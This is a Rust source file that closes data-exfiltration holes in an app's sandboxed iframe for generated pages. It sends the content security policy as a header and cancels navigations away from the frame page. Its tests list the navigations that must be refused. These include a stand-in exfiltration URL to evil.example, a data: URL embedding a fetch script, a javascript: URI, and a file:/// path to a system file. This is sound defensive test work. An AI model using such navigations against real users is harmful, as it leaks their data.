//! The generated-page frame (`http://artifact.localhost/frame.html`).
//!
//! Generated pages run inside an iframe sandboxed to `allow-scripts` (an opaque
//! origin: no IPC, no forms, no pop-ups, no top-level navigation) under a CSP that
//! blocks every request. Two holes were left (review, 2026-11-17):
//!
//! - the CSP was only a `<meta>` of the frame page, so it is now ALSO sent as the
//!   response header (read from that same meta, so there is one policy);
//! - CSP does not govern navigation, and a sandboxed frame may still navigate
//!   ITSELF (`location = "https://elsewhere/?" + data`): the document it lands on
//!   carries no CSP at all. WebView2's FrameNavigationStarting now cancels every
//!   frame navigation that is not to the frame page itself or `about:blank` /
//!   `about:srcdoc` (the only frames the window makes; the block editor's frame
//!   is a srcdoc one).

/// The frame page's own policy, read from its `http-equiv="Content-Security-Policy"` meta.
pub fn frame_csp(html: &str) -> Option<String> {
    let at = html.find("http-equiv=\"Content-Security-Policy\"")?;
    let rest = &html[at..];
    let start = rest.find("content=\"")? + "content=\"".len();
    let end = rest[start..].find('"')?;
    let csp = rest[start..start + end].trim();
    if csp.is_empty() { None } else { Some(csp.to_string()) }
}

/// The exact address the window loads the frame from.
pub const FRAME_URL: &str = "http://artifact.localhost/frame.html";

/// Whether a child frame may navigate to `uri`.
pub fn frame_navigation_allowed(uri: &str) -> bool {
    let u = uri.trim();
    if u == "about:blank" || u == "about:srcdoc" {
        return true;
    }
    // The frame page itself, with nothing but a fragment after it.
    u == FRAME_URL || u.strip_prefix(FRAME_URL).is_some_and(|rest| rest.starts_with('#'))
}

/// Cancels every frame navigation `frame_navigation_allowed` refuses, in the window's WebView2.
#[cfg(windows)]
pub fn install_navigation_guard(window: &tauri::WebviewWindow) {
    let result = window.with_webview(move |webview| {
        use webview2_com::{take_pwstr, NavigationStartingEventHandler};
        use windows::core::PWSTR;
        let installed = (|| -> windows::core::Result<()> {
            let core = unsafe { webview.controller().CoreWebView2()? };
            let handler = NavigationStartingEventHandler::create(Box::new(move |_sender, args| {
                let Some(args) = args else { return Ok(()) };
                let mut raw = PWSTR::null();
                unsafe { args.Uri(&mut raw)? };
                let uri = take_pwstr(raw);
                if !frame_navigation_allowed(&uri) {
                    unsafe { args.SetCancel(true)? };
                    let shown: String = uri.chars().take(80).collect();
                    log::warn!("[artifact-frame] a frame navigation was cancelled: {shown}");
                }
                Ok(())
            }));
            let mut token = 0i64;
            unsafe { core.add_FrameNavigationStarting(&handler, &mut token)? };
            Ok(())
        })();
        match installed {
            Ok(()) => log::info!("[artifact-frame] frame navigation guard installed"),
            Err(e) => log::error!("[artifact-frame] the frame navigation guard could not be installed: {e}"),
        }
    });
    if let Err(e) = result {
        log::error!("[artifact-frame] the webview could not be reached for the navigation guard: {e}");
    }
}

#[cfg(not(windows))]
pub fn install_navigation_guard(_window: &tauri::WebviewWindow) {}

#[cfg(test)]
mod tests {
    use super::*;

    const HTML: &str = include_str!("../../src/renderer/public/artifact-frame.html");

    #[test]
    fn the_header_policy_is_the_frame_page_own_policy() {
        let csp = frame_csp(HTML).expect("the frame page declares its policy");
        assert!(csp.starts_with("default-src 'none'"), "{csp}");
        assert!(!csp.contains("connect-src"), "nothing may be fetched: {csp}");
    }

    #[test]
    fn a_frame_may_only_stay_on_the_frame_page() {
        for ok in [FRAME_URL, "http://artifact.localhost/frame.html#top", "about:blank", "about:srcdoc"] {
            assert!(frame_navigation_allowed(ok), "{ok}");
        }
        for no in [
            "https://evil.example/?d=secret",
            "http://artifact.localhost/frame.html?x=1",
            "http://artifact.localhost/other",
            "http://tauri.localhost/index.html",
            "data:text/html,<script>fetch('https://x')</script>",
            "blob:null/1234",
            "javascript:alert(1)",
            "http://127.0.0.1:18181/v1/models",
            "file:///C:/Windows/win.ini",
        ] {
            assert!(!frame_navigation_allowed(no), "{no}");
        }
    }
}
